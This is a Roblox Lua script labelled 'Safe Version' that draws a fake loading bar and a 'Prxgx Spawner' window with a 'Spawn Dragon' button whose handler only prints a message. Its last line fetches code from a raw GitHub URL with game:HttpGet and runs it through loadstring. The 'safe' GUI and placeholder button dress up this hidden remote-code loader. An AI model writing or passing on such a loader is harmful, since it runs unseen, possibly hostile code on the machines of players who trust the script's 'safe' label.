--// Prxgx UI Script (Safe Version)

local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Prevent showing again in same session
if playerGui:FindFirstChild("PrxgxUI") then return end

-- Create ScreenGui
local gui = Instance.new("ScreenGui")
gui.Name = "PrxgxUI"
gui.Parent = playerGui

-- Loading Frame
local loading = Instance.new("Frame")
loading.Size = UDim2.new(0, 300, 0, 150)
loading.Position = UDim2.new(0.5, -150, 0.5, -75)
loading.BackgroundColor3 = Color3.fromRGB(20,20,20)
loading.Parent = gui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0.5,0)
title.Text = "Prxgx Scripts"
title.TextColor3 = Color3.new(1,1,1)
title.BackgroundTransparency = 1
title.Parent = loading

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1,0,0.5,0)
status.Position = UDim2.new(0,0,0.5,0)
status.Text = "Loading..."
status.TextColor3 = Color3.new(1,1,1)
status.BackgroundTransparency = 1
status.Parent = loading

-- Fake loading
for i = 1,100 do
	status.Text = "Loading "..i.."%"
	task.wait(0.02)
end

loading:Destroy()

-- Main Frame
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 300, 0, 200)
main.Position = UDim2.new(0.5, -150, 0.5, -100)
main.BackgroundColor3 = Color3.fromRGB(30,30,30)
main.Active = true
main.Draggable = true
main.Parent = gui

-- Title
local mainTitle = Instance.new("TextLabel")
mainTitle.Size = UDim2.new(1,0,0,40)
mainTitle.Text = "Prxgx Spawner"
mainTitle.TextColor3 = Color3.new(1,1,1)
mainTitle.BackgroundTransparency = 1
mainTitle.Parent = main

-- Button
local button = Instance.new("TextButton")
button.Size = UDim2.new(0.8,0,0,50)
button.Position = UDim2.new(0.1,0,0.5,0)
button.Text = "Spawn Dragon"
button.BackgroundColor3 = Color3.fromRGB(0,120,255)
button.TextColor3 = Color3.new(1,1,1)
button.Parent = main

-- Button Function (you can connect your logic here)
button.MouseButton1Click:Connect(function()
	print("Spawn Dragon clicked!")
	-- Put your legit function here
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/DragonEastSpawner.lua"))()
